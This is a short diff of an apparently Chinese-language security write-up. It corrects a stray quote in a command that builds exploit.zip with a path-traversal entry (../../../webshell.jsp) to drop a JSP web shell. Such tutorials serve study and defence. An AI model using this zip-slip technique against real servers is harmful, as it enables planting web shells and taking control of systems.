@@ -15,7 +15,7 @@ shell.jsp
 使用ZipCreater可以生成跨目录的文件名：
 
 ```
-$ zipcreater -source /tmp/payload/ -dest /tmp/exploit.zip -filename shell.jsp -path ../../../webshell.jsp'
+$ zipcreater -source /tmp/payload/ -dest /tmp/exploit.zip -filename shell.jsp -path ../../../webshell.jsp
 ```
 
 exploit.zip内容如下：
